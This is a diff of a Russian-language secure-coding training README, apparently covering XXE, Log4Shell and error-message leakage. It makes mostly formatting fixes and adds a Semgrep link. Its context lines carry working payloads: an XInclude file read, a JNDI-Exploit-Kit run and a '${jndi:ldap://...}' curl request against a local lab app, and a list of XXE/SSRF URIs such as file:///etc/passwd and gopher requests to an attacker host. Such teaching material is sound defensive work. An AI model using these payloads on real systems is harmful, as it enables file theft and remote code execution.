@@ -237,7 +237,6 @@ XInclude в любое значение данных в XML-документе, 
 включить. Например:
 
 ```xml
-
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
     <xi:include parse="text" href="jar:file:///c:/temp/secrets.zip!/secrets.txt"/>
 </foo>
@@ -294,7 +293,8 @@ xmlInputFactory.setProperty("javax.xml.stream.isSupportingExternalEntities", fal
 3. Проверяйте вводимые пользователем данные. Отклоняйте данные, /фильтруйте/избегайте, если возможно.
 
 Примеры корректного отключения поддержки DTD и внешних сущностей для различных XML парсеров представлены на
-странице https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
+странице https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html  
+и https://semgrep.dev/docs/cheat-sheets/java-xxe
 
 ### 1.3. Примеры
 
@@ -637,7 +637,7 @@ static boolean checkFileName(final String fileName) {
 public XsdResponse upload(@RequestParam("file") MultipartFile file, RedirectAttributes redirectAttributes) {
     String fileName = file.getOriginalFilename();
     if (fileName == null) {
-        throw new RuntimeException("Отсутсвует имя файла.");
+        throw new RuntimeException(String.format("Отсутствует имя файла."));
     }
     if (!checkFileName(fileName)) {
         throw new RuntimeException(String.format("Не валидное имя файла. %s", fileName));
@@ -1265,15 +1265,15 @@ curl localhost:8080/ -H 'X-Api-version: ${java:version}'
 ![cwe-94_4.png](readme_img/cwe-94_4.png)
 
 4. Запустим JNDI-Exploit-Kit (https://github.com/pimps/JNDI-Exploit-Kit):  
-`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "touch tmp/pwned1" -A "127.0.0.1"`  
-где “C” – команда, “A” – IP, на котором будут висеть LDAP и RMI сервера.
+   `java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "touch tmp/pwned1" -A "127.0.0.1"`  
+   где “C” – команда, “A” – IP, на котором будут висеть LDAP и RMI сервера.
 
 ![cwe-94_5.png](readme_img/cwe-94_5.png)
 
 5. Отправим подготовленный запрос в уязвимое приложение:  
-`curl localhost:8080/ -H 'X-Api-version: ${jndi:ldap://172.17.0.1:1389/ujkli2}'`
+   `curl localhost:8080/ -H 'X-Api-version: ${jndi:ldap://172.17.0.1:1389/ujkli2}'`
 6. Проверяем, выполнилась ли команда:
-`docker exec -it vulnerable-app ls tmp/`
+   `docker exec -it vulnerable-app ls tmp/`
 
 ![cwe-94_6.png](readme_img/cwe-94_6.png)
 
@@ -2618,7 +2618,7 @@ public void addUserSafeEscape(@RequestBody LoginForm loginForm, HttpServletRespo
 
 ### 11.2. Защитные меры
 
-Несколько советов, которые помогут предотвратить генерацию сообщений об ошибках, содержащих конфиденциальную информацию, в ваших приложениях: 
+Несколько советов, которые помогут предотвратить генерацию сообщений об ошибках, содержащих конфиденциальную информацию, в ваших приложениях:
 
 Убедитесь, что приложения не раскрывают ошибки разработки. Обычно эти настройки находятся в конфигурационном файле используемого фреймворка. Например, для Spring Boot сообщение об ошибке и любые ошибки привязки больше не включаются в страницу ошибок по умолчанию. Это снижает риск утечки информации клиенту. server.error.include-message и server.error.include-binding-errors могут быть использованы для управления включением сообщения и ошибок привязки соответственно. Поддерживаемые значения: always, on-param и never.
 
@@ -2799,32 +2799,32 @@ ENTITIES могут использоваться для определения D
 
 Поддерживаемые протоколы:
 1. File: could be used to read local file on the server
-`file:///etc/passwd`
+   `file:///etc/passwd`
 2. HTTP(s): useful in OOB Data Exfiltration
-`http(s)://securityidiots.com/lol.xml`
+   `http(s)://securityidiots.com/lol.xml`
 3. FTP: useful in OOB Data Exfiltration & hitting the internal FTP service which is behind NAT
-`ftp://securityidiots.com/lol.xml`
+   `ftp://securityidiots.com/lol.xml`
 4. SFTP: hitting the internal SFTP service which is behind NAT
-`sftp://securityidiots.com:11111/`
+   `sftp://securityidiots.com:11111/`
 5. TFTP: hitting the internal TFTP service which is behind NAT
-`tftp://securityidiots.com:12346/lol.xml`
+   `tftp://securityidiots.com:12346/lol.xml`
 6. DICT : could also be used to make requests to internal services
-`dict://ip:22/_XXX`
-`dict://ip:6379/_XXX`
+   `dict://ip:22/_XXX`
+   `dict://ip:6379/_XXX`
 7. NETDOC: This could be used as an alternative to file in JAVA based Servers.
-`netdoc:/etc/passwd`
+   `netdoc:/etc/passwd`
 8. LDAP: could be used to query internal LDAP Service.
-`ldap://localhost:11211/%0astats%0aquit`
+   `ldap://localhost:11211/%0astats%0aquit`
 9. GOPHER:
-`gopher://<host>:<port>/_<gopher-path>`
-`gopher://<host>:25/%0AHELO ... (executing commands on internal SMTP Service)`
+   `gopher://<host>:<port>/_<gopher-path>`
+   `gopher://<host>:25/%0AHELO ... (executing commands on internal SMTP Service)`
 10. Making internal HTTP Requests(GET,POST..etc):
-`gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A`
-`gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body`
+    `gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A`
+    `gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body`
 11. PHP: if PHP is installed we can use PHP Wrappers to read PHP source codes as Base64 content.
-`php://filter/convert.base64-encode/resource=index.php`
+    `php://filter/convert.base64-encode/resource=index.php`
 12. Data:
-`data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk`
+    `data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk`
 
 ### 1.3. XML схема
 
@@ -2859,12 +2859,12 @@ ENTITIES могут использоваться для определения D
 
 Строковые элементы в приведенном примере схемы называются объявлениями.  
 Объявления являются мощным средством управления структурой данных. Например, объявление `<xsd:sequence>` означает, что теги, такие как username, password, group и email должны следовать в указанном выше порядке. С помощью объявлений можно также проверять типы данных, вводимых пользователем. Например, приведенная выше схема требует ввода положительного целого числа для идентификатора пользователя.  
-Если данные в XML-файле соответствуют правилам схемы, то такие данные называют допустимыми. Процесс контроля соответствия XML-файла данных правилам схемы называют (достаточно логично) проверкой. Большим преимуществом использования схем является возможность предотвратить с их помощью повреждение данных. Схемы также облегчают поиск поврежденных данных, поскольку при возникновении такой проблемы обработка XML-файла останавливается.  
+Если данные в XML-файле соответствуют правилам схемы, то такие данные называют допустимыми. Процесс контроля соответствия XML-файла данных правилам схемы называют (достаточно логично) проверкой. Большим преимуществом использования схем является возможность предотвратить с их помощью повреждение данных. Схемы также облегчают поиск поврежденных данных, поскольку при возникновении такой проблемы обработка XML-файла останавливается.
 
 ### 1.4. Преобразования
 
 XML также позволяет повторно использовать данные. Механизм повторного использования данных называется преобразованием XSLT (или просто преобразованием).  
-Преобразования можно использовать для обмена данными между серверными системами, например между базами данных, или для представления данных в виде html. Так же используется для трансформации XML документов в другие форматы (например, для трансформации XML в HTML).  
+Преобразования можно использовать для обмена данными между серверными системами, например между базами данных, или для представления данных в виде html. Так же используется для трансформации XML документов в другие форматы (например, для трансформации XML в HTML).
 
 ### 1.5. Объектная модель  XML-документов (Document Object Model - DOM)
 
